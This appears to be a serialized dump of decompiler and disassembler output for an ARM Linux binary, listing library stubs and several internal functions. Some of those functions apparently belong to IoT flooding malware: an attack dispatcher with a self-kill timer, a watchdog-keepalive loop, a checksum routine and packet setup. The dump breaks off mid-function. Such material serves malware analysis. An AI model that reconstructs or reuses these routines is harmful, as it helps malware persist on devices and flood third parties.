(dp0
S'select'
p1
(S'\n__stdcall select(int __nfds, fd_set * __readfds, fd_set * __writefds, fd_set * __exceptfds, timeval * __timeout)\n'
p2
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint select(int __nfds,fd_set *__readfds,fd_set *__writefds,fd_set *__exceptfds,timeval *__timeout)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008940. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132b4)();\u000a  return iVar1;\u000a}\u000a\u000a
p3
S'adr r12,0x8940\nadd r12,r12,#0xa000\nldr pc,[r12,#0x974]!\n'
p4
S'00 c6 8f e2\n0a ca 8c e2\n74 f9 bc e5\n'
p5
S'.plt:00008938\n.plt:0000893c\n.plt:00008940\n'
p6
tp7
sS'sendto'
p8
(S'\n__stdcall sendto(int __fd, void * __buf, size_t __n, int __flags, sockaddr * __addr, socklen_t __addr_len)\n'
p9
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t sendto(int __fd,void *__buf,size_t __n,int __flags,sockaddr *__addr,socklen_t __addr_len)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089c4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_000132e0)();\u000a  return sVar1;\u000a}\u000a\u000a
p10
S'adr r12,0x89c4\nadd r12,r12,#0xa000\nldr pc,[r12,#0x91c]!\n'
p11
S'00 c6 8f e2\n0a ca 8c e2\n1c f9 bc e5\n'
p12
S'.plt:000089bc\n.plt:000089c0\n.plt:000089c4\n'
p13
tp14
sS'FUN_00008b28'
p15
(S'\n__stdcall FUN_00008b28(undefined param_1, undefined param_2, undefined param_3, undefined param_4, undefined1 param_5, undefined4 param_6)\n'
p16
V\u000avoid FUN_00008b28(uint param_1,uint param_2,undefined4 param_3,undefined4 param_4,byte param_5,\u000a                 undefined4 param_6)\u000a\u000a{\u000a  code cVar1;\u000a  __pid_t __pid;\u000a  uint uVar2;\u000a  code **ppcVar3;\u000a  \u000a  __pid = fork();\u000a  uVar2 = (uint)(__pid == -1);\u000a  if (0 < __pid) {\u000a    uVar2 = 1;\u000a  }\u000a  if (uVar2 != 0) {\u000a    return;\u000a  }\u000a  __pid = fork();\u000a  if (__pid == -1) {\u000a                    /* WARNING: Subroutine does not return */\u000a    exit(0);\u000a  }\u000a  if (__pid == 0) {\u000a    sleep(param_1);\u000a    __pid = getppid();\u000a    kill(__pid,9);\u000a                    /* WARNING: Subroutine does not return */\u000a    exit(0);\u000a  }\u000a  if (*PTR_DAT_00008c1c != 0) {\u000a    ppcVar3 = (code **)**(code ***)PTR_DAT_00008c20;\u000a    cVar1 = *(code *)(ppcVar3 + 1);\u000a    while ((uint)(byte)cVar1 != param_2) {\u000a      uVar2 = uVar2 + 1;\u000a      if (uVar2 == (uint)(byte)*PTR_DAT_00008c1c) goto LAB_00008bf4;\u000a      ppcVar3 = (code **)(*(code ***)PTR_DAT_00008c20)[uVar2];\u000a      cVar1 = *(code *)(ppcVar3 + 1);\u000a    }\u000a    (**ppcVar3)(param_3,param_4,(uint)param_5,param_6);\u000a  }\u000aLAB_00008bf4:\u000a                    /* WARNING: Subroutine does not return */\u000a  exit(0);\u000a}\u000a\u000a
p17
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 lr }\ncpy r9,r3\ncpy r6,r0\ncpy r7,r1\ncpy r10,r2\nldrb r8,[sp,#0x20]\nbl 0x000089d4\ncmn r0,#0x1\nmovne r3,#0x0\nmoveq r3,#0x1\ncmp r0,#0x0\ncpyle r5,r3\norrgt r5,r3,#0x1\ncmp r5,#0x0\nbeq 0x00008b6c\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 lr }\nbx lr\nbl 0x000089d4\ncmn r0,#0x1\ncpy r4,r0\nbeq 0x00008ba0\ncmp r0,#0x0\nbne 0x00008ba8\ncpy r0,r6\nbl 0x00008920\nbl 0x000089ec\nmov r1,#0x9\nbl 0x00008980\ncpy r0,r4\nbl 0x00008a1c\ncpy r0,r5\nbl 0x00008a1c\nldr r3,[0x8c1c]\nldrb r1,[r3,#0x0]\ncmp r1,#0x0\nbeq 0x00008bf4\nldr r3,[0x8c20]\nldr r2,[r3,#0x0]\nldr r12,[r2,#0x0]\nldrb r3,[r12,#0x4]\ncmp r3,r7\ncpyne r0,r5\nbne 0x00008be8\nb 0x00008bfc\nldr r12,[r2,r0,lsl #0x2]\nldrb r3,[r12,#0x4]\ncmp r3,r7\nbeq 0x00008bfc\nadd r0,r0,#0x1\ncmp r0,r1\nbne 0x00008bd8\nmov r0,#0x0\nbl 0x00008a1c\ncpy r0,r10\ncpy r1,r9\ncpy r2,r8\nldr r3,[sp,#0x24]\nldr r12,[r12,#0x0]\nmov lr,pc\nbx r12\nb 0x00008bf4\n'
p18
S'f0 47 2d e9\n03 90 a0 e1\n00 60 a0 e1\n01 70 a0 e1\n02 a0 a0 e1\n20 80 dd e5\na3 ff ff eb\n01 00 70 e3\n00 30 a0 13\n01 30 a0 03\n00 00 50 e3\n03 50 a0 d1\n01 50 83 c3\n00 00 55 e3\n01 00 00 0a\nf0 47 bd e8\n1e ff 2f e1\n98 ff ff eb\n01 00 70 e3\n00 40 a0 e1\n08 00 00 0a\n00 00 50 e3\n08 00 00 1a\n06 00 a0 e1\n64 ff ff eb\n96 ff ff eb\n09 10 a0 e3\n79 ff ff eb\n04 00 a0 e1\n9e ff ff eb\n05 00 a0 e1\n9c ff ff eb\n6c 30 9f e5\n00 10 d3 e5\n00 00 51 e3\n0e 00 00 0a\n60 30 9f e5\n00 20 93 e5\n00 c0 92 e5\n04 30 dc e5\n07 00 53 e1\n05 00 a0 11\n04 00 00 1a\n08 00 00 ea\n00 c1 92 e7\n04 30 dc e5\n07 00 53 e1\n04 00 00 0a\n01 00 80 e2\n01 00 50 e1\nf8 ff ff 1a\n00 00 a0 e3\n87 ff ff eb\n0a 00 a0 e1\n09 10 a0 e1\n08 20 a0 e1\n24 30 9d e5\n00 c0 9c e5\n0f e0 a0 e1\n1c ff 2f e1\nf5 ff ff ea\n'
p19
S'.text:00008b28\n.text:00008b2c\n.text:00008b30\n.text:00008b34\n.text:00008b38\n.text:00008b3c\n.text:00008b40\n.text:00008b44\n.text:00008b48\n.text:00008b4c\n.text:00008b50\n.text:00008b54\n.text:00008b58\n.text:00008b5c\n.text:00008b60\n.text:00008b64\n.text:00008b68\n.text:00008b6c\n.text:00008b70\n.text:00008b74\n.text:00008b78\n.text:00008b7c\n.text:00008b80\n.text:00008b84\n.text:00008b88\n.text:00008b8c\n.text:00008b90\n.text:00008b94\n.text:00008b98\n.text:00008b9c\n.text:00008ba0\n.text:00008ba4\n.text:00008ba8\n.text:00008bac\n.text:00008bb0\n.text:00008bb4\n.text:00008bb8\n.text:00008bbc\n.text:00008bc0\n.text:00008bc4\n.text:00008bc8\n.text:00008bcc\n.text:00008bd0\n.text:00008bd4\n.text:00008bd8\n.text:00008bdc\n.text:00008be0\n.text:00008be4\n.text:00008be8\n.text:00008bec\n.text:00008bf0\n.text:00008bf4\n.text:00008bf8\n.text:00008bfc\n.text:00008c00\n.text:00008c04\n.text:00008c08\n.text:00008c0c\n.text:00008c10\n.text:00008c14\n.text:00008c18\n'
p20
tp21
sS'prctl'
p22
(S'\n__stdcall prctl(int __option)\n'
p23
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint prctl(int __option,...)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008910. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132a4)();\u000a  return iVar1;\u000a}\u000a\u000a
p24
S'adr r12,0x8910\nadd r12,r12,#0xa000\nldr pc,[r12,#0x994]!\n'
p25
S'00 c6 8f e2\n0a ca 8c e2\n94 f9 bc e5\n'
p26
S'.plt:00008908\n.plt:0000890c\n.plt:00008910\n'
p27
tp28
sS'realloc'
p29
(S'\n__stdcall realloc(void * __ptr, size_t __size)\n'
p30
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid * realloc(void *__ptr,size_t __size)\u000a\u000a{\u000a  void *pvVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089d0. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pvVar1 = (void *)(*(code *)PTR_LAB_000132e4)();\u000a  return pvVar1;\u000a}\u000a\u000a
p31
S'adr r12,0x89d0\nadd r12,r12,#0xa000\nldr pc,[r12,#0x914]!\n'
p32
S'00 c6 8f e2\n0a ca 8c e2\n14 f9 bc e5\n'
p33
S'.plt:000089c8\n.plt:000089cc\n.plt:000089d0\n'
p34
tp35
sS'strcpy'
p36
(S'\n__stdcall strcpy(char * __dest, char * __src)\n'
p37
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000achar * strcpy(char *__dest,char *__src)\u000a\u000a{\u000a  char *pcVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000088c8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pcVar1 = (char *)(*(code *)PTR_LAB_0001328c)();\u000a  return pcVar1;\u000a}\u000a\u000a
p38
S'adr r12,0x88c8\nadd r12,r12,#0xa000\nldr pc,[r12,#0x9c4]!\n'
p39
S'00 c6 8f e2\n0a ca 8c e2\nc4 f9 bc e5\n'
p40
S'.plt:000088c0\n.plt:000088c4\n.plt:000088c8\n'
p41
tp42
sS'bind'
p43
(S'\n__stdcall bind(int __fd, sockaddr * __addr, socklen_t __len)\n'
p44
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint bind(int __fd,sockaddr *__addr,socklen_t __len)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008994. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000132d0)();\u000a  return iVar1;\u000a}\u000a\u000a
p45
S'adr r12,0x8994\nadd r12,r12,#0xa000\nldr pc,[r12,#0x93c]!\n'
p46
S'00 c6 8f e2\n0a ca 8c e2\n3c f9 bc e5\n'
p47
S'.plt:0000898c\n.plt:00008990\n.plt:00008994\n'
p48
tp49
sS'raise'
p50
(S'\n__stdcall raise(int __sig)\n'
p51
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint raise(int __sig)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a6c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013318)();\u000a  return iVar1;\u000a}\u000a\u000a
p52
S'adr r12,0x8a6c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8ac]!\n'
p53
S'00 c6 8f e2\n0a ca 8c e2\nac f8 bc e5\n'
p54
S'.plt:00008a64\n.plt:00008a68\n.plt:00008a6c\n'
p55
tp56
sS'__errno_location'
p57
(S'\n__stdcall __errno_location()\n'
p58
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint * __errno_location(void)\u000a\u000a{\u000a  int *piVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a18. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  piVar1 = (int *)(*(code *)PTR_LAB_000132fc)();\u000a  return piVar1;\u000a}\u000a\u000a
p59
S'adr r12,0x8a18\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8e4]!\n'
p60
S'00 c6 8f e2\n0a ca 8c e2\ne4 f8 bc e5\n'
p61
S'.plt:00008a10\n.plt:00008a14\n.plt:00008a18\n'
p62
tp63
sS'FUN_00008e40'
p64
(S'\n__stdcall FUN_00008e40()\n'
p65
V\u000ain_addr_t FUN_00008e40(int iParm1,char **ppcParm2,uint uParm3,in_addr_t iParm4)\u000a\u000a{\u000a  char **ppcVar1;\u000a  int iVar2;\u000a  \u000a  if (iParm1 != 0) {\u000a    if ((uint)*(byte *)(ppcParm2 + 1) != uParm3) {\u000a      iVar2 = 0;\u000a      ppcVar1 = ppcParm2 + 2;\u000a      do {\u000a        ppcParm2 = ppcVar1;\u000a        iVar2 = iVar2 + 1;\u000a        if (iParm1 == iVar2) {\u000a          return iParm4;\u000a        }\u000a        ppcVar1 = ppcParm2 + 2;\u000a      } while (uParm3 != (uint)*(byte *)(ppcParm2 + 1));\u000a    }\u000a    if (*ppcParm2 != (char *)0x0) {\u000a      iParm4 = inet_addr(*ppcParm2);\u000a    }\u000a  }\u000a  return iParm4;\u000a}\u000a\u000a
p66
S'cmp r0,#0x0\nstmdb sp!,{ r4 lr }\ncpy r4,r3\nbeq 0x00008e88\nldrb r3,[r1,#0x4]\ncmp r3,r2\naddne r12,r1,#0x8\nmovne lr,#0x0\nbne 0x00008e78\nb 0x00008e94\nldrb r3,[r12,#0x4]\ncmp r2,r3\nadd r12,r12,#0x8\nbeq 0x00008e94\nadd lr,lr,#0x1\ncmp r0,lr\ncpy r1,r12\nbne 0x00008e68\ncpy r0,r4\nldmia sp!,{ r4 lr }\nbx lr\nldr r0,[r1,#0x0]\ncmp r0,#0x0\nbeq 0x00008e88\nbl 0x00008998\ncpy r4,r0\nb 0x00008e88\n'
p67
S'00 00 50 e3\n10 40 2d e9\n03 40 a0 e1\n0d 00 00 0a\n04 30 d1 e5\n02 00 53 e1\n08 c0 81 12\n00 e0 a0 13\n04 00 00 1a\n0a 00 00 ea\n04 30 dc e5\n03 00 52 e1\n08 c0 8c e2\n06 00 00 0a\n01 e0 8e e2\n0e 00 50 e1\n0c 10 a0 e1\nf7 ff ff 1a\n04 00 a0 e1\n10 40 bd e8\n1e ff 2f e1\n00 00 91 e5\n00 00 50 e3\nf9 ff ff 0a\nbc fe ff eb\n00 40 a0 e1\nf6 ff ff ea\n'
p68
S'.text:00008e40\n.text:00008e44\n.text:00008e48\n.text:00008e4c\n.text:00008e50\n.text:00008e54\n.text:00008e58\n.text:00008e5c\n.text:00008e60\n.text:00008e64\n.text:00008e68\n.text:00008e6c\n.text:00008e70\n.text:00008e74\n.text:00008e78\n.text:00008e7c\n.text:00008e80\n.text:00008e84\n.text:00008e88\n.text:00008e8c\n.text:00008e90\n.text:00008e94\n.text:00008e98\n.text:00008e9c\n.text:00008ea0\n.text:00008ea4\n.text:00008ea8\n'
p69
tp70
sS'signal'
p71
(S'\n__stdcall signal(int __sig, __sighandler_t __handler)\n'
p72
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000a__sighandler_t signal(int __sig,__sighandler_t __handler)\u000a\u000a{\u000a  __sighandler_t pVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089b8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pVar1 = (__sighandler_t)(*(code *)PTR_LAB_000132dc)();\u000a  return pVar1;\u000a}\u000a\u000a
p73
S'adr r12,0x89b8\nadd r12,r12,#0xa000\nldr pc,[r12,#0x924]!\n'
p74
S'00 c6 8f e2\n0a ca 8c e2\n24 f9 bc e5\n'
p75
S'.plt:000089b0\n.plt:000089b4\n.plt:000089b8\n'
p76
tp77
sS'write'
p78
(S'\n__stdcall write(int __fd, void * __buf, size_t __n)\n'
p79
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t write(int __fd,void *__buf,size_t __n)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x0000897c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_000132c8)();\u000a  return sVar1;\u000a}\u000a\u000a
p80
S'adr r12,0x897c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x94c]!\n'
p81
S'00 c6 8f e2\n0a ca 8c e2\n4c f9 bc e5\n'
p82
S'.plt:00008974\n.plt:00008978\n.plt:0000897c\n'
p83
tp84
sS'FUN_0000992c'
p85
(S'\n__stdcall FUN_0000992c()\n'
p86
V\u000auint FUN_0000992c(ushort *puParm1,uint uParm2)\u000a\u000a{\u000a  ushort *puVar1;\u000a  uint uVar2;\u000a  \u000a  if (uParm2 < 2) {\u000a    uVar2 = 0;\u000a  }\u000a  else {\u000a    uVar2 = 0;\u000a    puVar1 = puParm1;\u000a    do {\u000a      uParm2 = uParm2 - 2;\u000a      puParm1 = puVar1 + 1;\u000a      uVar2 = uVar2 + (uint)*puVar1;\u000a      puVar1 = puParm1;\u000a    } while (1 < uParm2);\u000a  }\u000a  if (uParm2 == 1) {\u000a    uVar2 = uVar2 + (uint)*(byte *)puParm1;\u000a  }\u000a  uVar2 = (uVar2 & 0xffff) + (uVar2 >> 0x10);\u000a  return ~(uVar2 + (uVar2 >> 0x10)) & 0xffff;\u000a}\u000a\u000a
p87
S'cmp r1,#0x1\nmovls r2,#0x0\nbls 0x00009950\nmov r2,#0x0\nsub r1,r1,#0x2\nldrh r3,[r0],#0x2\ncmp r1,#0x1\nadd r2,r2,r3\nbhi 0x0000993c\ncmp r1,#0x1\nldrbeq r3,[r0,#0x0]\naddeq r2,r2,r3\nmov r0,r2, lsl #0x10\nmov r0,r0, lsr #0x10\nadd r0,r0,r2, lsr #0x10\nadd r0,r0,r0, lsr #0x10\nmvn r0,r0\nmov r0,r0, lsl #0x10\nmov r0,r0, lsr #0x10\nbx lr\n'
p88
S'01 00 51 e3\n00 20 a0 93\n05 00 00 9a\n00 20 a0 e3\n02 10 41 e2\nb2 30 d0 e0\n01 00 51 e3\n03 20 82 e0\nfa ff ff 8a\n01 00 51 e3\n00 30 d0 05\n03 20 82 00\n02 08 a0 e1\n20 08 a0 e1\n22 08 80 e0\n20 08 80 e0\n00 00 e0 e1\n00 08 a0 e1\n20 08 a0 e1\n1e ff 2f e1\n'
p89
S'.text:0000992c\n.text:00009930\n.text:00009934\n.text:00009938\n.text:0000993c\n.text:00009940\n.text:00009944\n.text:00009948\n.text:0000994c\n.text:00009950\n.text:00009954\n.text:00009958\n.text:0000995c\n.text:00009960\n.text:00009964\n.text:00009968\n.text:0000996c\n.text:00009970\n.text:00009974\n.text:00009978\n'
p90
tp91
sS'FUN_00009a5c'
p92
(S'\n__stdcall FUN_00009a5c()\n'
p93
V\u000avoid FUN_00009a5c(void)\u000a\u000a{\u000a  __pid_t _Var1;\u000a  char *__file;\u000a  int __fd;\u000a  undefined4 local_14 [2];\u000a  \u000a  _Var1 = fork();\u000a  *(__pid_t *)PTR_DAT_00009ba8 = _Var1;\u000a  if (0 < _Var1 || _Var1 == -1) {\u000a    return;\u000a  }\u000a  local_14[0] = 1;\u000a  FUN_0000a63c(0x1d);\u000a  FUN_0000a63c(0x1e);\u000a  FUN_0000a63c(0x1f);\u000a  FUN_0000a63c(0x20);\u000a  __file = (char *)FUN_0000a578(0x1d,0);\u000a  __fd = open(__file,2);\u000a  if (__fd == -1) {\u000a    __file = (char *)FUN_0000a578(0x1e,0);\u000a    __fd = open(__file,2);\u000a    if (__fd == -1) {\u000a      __file = (char *)FUN_0000a578(0x1f,0);\u000a      __fd = open(__file,2);\u000a      if (__fd == -1) {\u000a        __file = (char *)FUN_0000a578(0x20,0);\u000a        __fd = open(__file,2);\u000a        if (__fd == -1) {\u000a          FUN_0000a59c(0x1d);\u000a          FUN_0000a59c(0x1e);\u000a          FUN_0000a59c(0x1f);\u000a          FUN_0000a59c(0x20);\u000a                    /* WARNING: Subroutine does not return */\u000a          exit(0);\u000a        }\u000a      }\u000a    }\u000a  }\u000a  ioctl(__fd,0x80045704,local_14);\u000a  do {\u000a    ioctl(__fd,0x80045705,0);\u000a    sleep(10);\u000a  } while( true );\u000a}\u000a\u000a
p94
S'stmdb sp!,{ r4 r5 lr }\nsub sp,sp,#0xc\nbl 0x000089d4\ncmn r0,#0x1\nmovne r3,#0x0\nmoveq r3,#0x1\ncmp r0,#0x0\ncpyle r5,r3\norrgt r5,r3,#0x1\nldr r3,[0x9ba8]\ncmp r5,#0x0\nstr r0,[r3,#0x0]\nbeq 0x00009a9c\nadd sp,sp,#0xc\nldmia sp!,{ r4 r5 lr }\nbx lr\nmov r3,#0x1\nmov r0,#0x1d\nstr r3,[sp,#0x4]\nbl 0x0000a63c\nmov r0,#0x1e\nbl 0x0000a63c\nmov r0,#0x1f\nbl 0x0000a63c\nmov r0,#0x20\nbl 0x0000a63c\ncpy r1,r5\nmov r0,#0x1d\nbl 0x0000a578\nmov r1,#0x2\nbl 0x00008a28\ncmn r0,#0x1\ncpy r4,r0\nbeq 0x00009b20\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000004\ncpy r0,r4\nadd r2,sp,#0x4\nbl 0x000088cc\nmov r1,#0x45000\nadd r1,r1,#0x700\nadd r1,r1,#0x80000005\ncpy r0,r4\nmov r2,#0x0\nbl 0x000088cc\nmov r0,#0xa\nbl 0x00008920\nb 0x00009afc\ncpy r1,r5\nmov r0,#0x1e\nbl 0x0000a578\nmov r1,#0x2\nbl 0x00008a28\ncmn r0,#0x1\ncpy r4,r0\nbne 0x00009ae4\ncpy r1,r5\nmov r0,#0x1f\nbl 0x0000a578\nmov r1,#0x2\nbl 0x00008a28\ncmn r0,#0x1\ncpy r4,r0\nbne 0x00009ae4\ncpy r1,r5\nmov r0,#0x20\nbl 0x0000a578\nmov r1,#0x2\nbl 0x00008a28\ncmn r0,#0x1\ncpy r4,r0\nbne 0x00009ae4\nmov r0,#0x1d\nbl 0x0000a59c\nmov r0,#0x1e\nbl 0x0000a59c\nmov r0,#0x1f\nbl 0x0000a59c\nmov r0,#0x20\nbl 0x0000a59c\ncpy r0,r5\nbl 0x00008a1c\n'
p95
S'30 40 2d e9\n0c d0 4d e2\nda fb ff eb\n01 00 70 e3\n00 30 a0 13\n01 30 a0 03\n00 00 50 e3\n03 50 a0 d1\n01 50 83 c3\n20 31 9f e5\n00 00 55 e3\n00 00 83 e5\n02 00 00 0a\n0c d0 8d e2\n30 40 bd e8\n1e ff 2f e1\n01 30 a0 e3\n1d 00 a0 e3\n04 30 8d e5\ne3 02 00 eb\n1e 00 a0 e3\ne1 02 00 eb\n1f 00 a0 e3\ndf 02 00 eb\n20 00 a0 e3\ndd 02 00 eb\n05 10 a0 e1\n1d 00 a0 e3\na9 02 00 eb\n02 10 a0 e3\nd3 fb ff eb\n01 00 70 e3\n00 40 a0 e1\n0e 00 00 0a\n45 1a a0 e3\n07 1c 81 e2\n12 11 81 e2\n04 00 a0 e1\n04 20 8d e2\n73 fb ff eb\n45 1a a0 e3\n07 1c 81 e2\n16 11 81 e2\n04 00 a0 e1\n00 20 a0 e3\n6d fb ff eb\n0a 00 a0 e3\n80 fb ff eb\nf6 ff ff ea\n05 10 a0 e1\n1e 00 a0 e3\n92 02 00 eb\n02 10 a0 e3\nbc fb ff eb\n01 00 70 e3\n00 40 a0 e1\ne8 ff ff 1a\n05 10 a0 e1\n1f 00 a0 e3\n8a 02 00 eb\n02 10 a0 e3\nb4 fb ff eb\n01 00 70 e3\n00 40 a0 e1\ne0 ff ff 1a\n05 10 a0 e1\n20 00 a0 e3\n82 02 00 eb\n02 10 a0 e3\nac fb ff eb\n01 00 70 e3\n00 40 a0 e1\nd8 ff ff 1a\n1d 00 a0 e3\n84 02 00 eb\n1e 00 a0 e3\n82 02 00 eb\n1f 00 a0 e3\n80 02 00 eb\n20 00 a0 e3\n7e 02 00 eb\n05 00 a0 e1\n9c fb ff eb\n'
p96
S'.text:00009a5c\n.text:00009a60\n.text:00009a64\n.text:00009a68\n.text:00009a6c\n.text:00009a70\n.text:00009a74\n.text:00009a78\n.text:00009a7c\n.text:00009a80\n.text:00009a84\n.text:00009a88\n.text:00009a8c\n.text:00009a90\n.text:00009a94\n.text:00009a98\n.text:00009a9c\n.text:00009aa0\n.text:00009aa4\n.text:00009aa8\n.text:00009aac\n.text:00009ab0\n.text:00009ab4\n.text:00009ab8\n.text:00009abc\n.text:00009ac0\n.text:00009ac4\n.text:00009ac8\n.text:00009acc\n.text:00009ad0\n.text:00009ad4\n.text:00009ad8\n.text:00009adc\n.text:00009ae0\n.text:00009ae4\n.text:00009ae8\n.text:00009aec\n.text:00009af0\n.text:00009af4\n.text:00009af8\n.text:00009afc\n.text:00009b00\n.text:00009b04\n.text:00009b08\n.text:00009b0c\n.text:00009b10\n.text:00009b14\n.text:00009b18\n.text:00009b1c\n.text:00009b20\n.text:00009b24\n.text:00009b28\n.text:00009b2c\n.text:00009b30\n.text:00009b34\n.text:00009b38\n.text:00009b3c\n.text:00009b40\n.text:00009b44\n.text:00009b48\n.text:00009b4c\n.text:00009b50\n.text:00009b54\n.text:00009b58\n.text:00009b5c\n.text:00009b60\n.text:00009b64\n.text:00009b68\n.text:00009b6c\n.text:00009b70\n.text:00009b74\n.text:00009b78\n.text:00009b7c\n.text:00009b80\n.text:00009b84\n.text:00009b88\n.text:00009b8c\n.text:00009b90\n.text:00009b94\n.text:00009b98\n.text:00009b9c\n.text:00009ba0\n.text:00009ba4\n'
p97
tp98
sS'getsockname'
p99
(S'\n__stdcall getsockname(int __fd, sockaddr * __addr, socklen_t * __len)\n'
p100
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint getsockname(int __fd,sockaddr *__addr,socklen_t *__len)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a90. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013324)();\u000a  return iVar1;\u000a}\u000a\u000a
p101
S'adr r12,0x8a90\nadd r12,r12,#0xa000\nldr pc,[r12,#0x894]!\n'
p102
S'00 c6 8f e2\n0a ca 8c e2\n94 f8 bc e5\n'
p103
S'.plt:00008a88\n.plt:00008a8c\n.plt:00008a90\n'
p104
tp105
sS'FUN_0000ac64'
p106
(S'\n__stdcall FUN_0000ac64()\n'
p107
V\u000avoid FUN_0000ac64(int iParm1,int iParm2,int iParm3)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a  if (iParm3 == 0) {\u000a    return;\u000a  }\u000a  iVar1 = 0;\u000a  do {\u000a    *(undefined *)(iVar1 + iParm1) = *(undefined *)(iVar1 + iParm2);\u000a    iVar1 = iVar1 + 1;\u000a  } while (iVar1 != iParm3);\u000a  return;\u000a}\u000a\u000a
p108
S'cmp r2,#0x0\nbxeq lr\nmov r12,#0x0\nldrb r3,[r12,r1]\nstrb r3,[r12,r0]\nadd r12,r12,#0x1\ncmp r12,r2\nbne 0x0000ac70\nbx lr\n'
p109
S'00 00 52 e3\n1e ff 2f 01\n00 c0 a0 e3\n01 30 dc e7\n00 30 cc e7\n01 c0 8c e2\n02 00 5c e1\nfa ff ff 1a\n1e ff 2f e1\n'
p110
S'.text:0000ac64\n.text:0000ac68\n.text:0000ac6c\n.text:0000ac70\n.text:0000ac74\n.text:0000ac78\n.text:0000ac7c\n.text:0000ac80\n.text:0000ac84\n'
p111
tp112
sS'FUN_0000abf4'
p113
(S'\n__stdcall FUN_0000abf4()\n'
p114
V\u000avoid FUN_0000abf4(char *pcParm1)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a  if (*pcParm1 == 0) {\u000a    return;\u000a  }\u000a  iVar1 = 0;\u000a  do {\u000a    iVar1 = iVar1 + 1;\u000a  } while (pcParm1[iVar1] != 0);\u000a  return;\u000a}\u000a\u000a
p115
S'cpy r2,r0\nldrb r0,[r0,#0x0]\ncmp r0,#0x0\nbxeq lr\nmov r0,#0x0\nadd r0,r0,#0x1\nldrb r3,[r0,r2]\ncmp r3,#0x0\nbne 0x0000ac08\nbx lr\n'
p116
S'00 20 a0 e1\n00 00 d0 e5\n00 00 50 e3\n1e ff 2f 01\n00 00 a0 e3\n01 00 80 e2\n02 30 d0 e7\n00 00 53 e3\nfb ff ff 1a\n1e ff 2f e1\n'
p117
S'.text:0000abf4\n.text:0000abf8\n.text:0000abfc\n.text:0000ac00\n.text:0000ac04\n.text:0000ac08\n.text:0000ac0c\n.text:0000ac10\n.text:0000ac14\n.text:0000ac18\n'
p118
tp119
sS'FUN_00008fe0'
p120
(S'\n__stdcall FUN_00008fe0()\n'
p121
V\u000avoid FUN_00008fe0(size_t sParm1,int iParm2,undefined4 uParm3,undefined4 uParm4)\u000a\u000a{\u000a  undefined2 uVar1;\u000a  void *pvVar2;\u000a  void *pvVar3;\u000a  uint uVar4;\u000a  uint uVar5;\u000a  uint __n;\u000a  uint uVar6;\u000a  int __fd;\u000a  void *__buf;\u000a  uint uVar7;\u000a  sockaddr *__addr;\u000a  size_t sVar8;\u000a  int iVar9;\u000a  bool bVar10;\u000a  ushort local_44;\u000a  int local_3c;\u000a  undefined4 local_38;\u000a  undefined4 local_34;\u000a  undefined4 local_30;\u000a  undefined4 local_2c;\u000a  \u000a  pvVar2 = calloc(sParm1,4);\u000a  pvVar3 = calloc(sParm1,4);\u000a  uVar4 = FUN_00008eac(uParm3,uParm4,7,0xffff);\u000a  uVar5 = FUN_00008eac(uParm3,uParm4,6,0xffff);\u000a  __n = FUN_00008eac(uParm3,uParm4,0,0x400);\u000a  uVar7 = 1;\u000a  __n = __n & 0xffff;\u000a  uVar6 = FUN_00008eac(uParm3,uParm4,1,1);\u000a  local_44 = 0;\u000a  bVar10 = (uVar5 & 0xffff) != 0xffff;\u000a  if (bVar10) {\u000a    uVar7 = uVar5 & 0xff;\u000a  }\u000a  local_2c = 0;\u000a  local_38 = 0;\u000a  local_34 = 0;\u000a  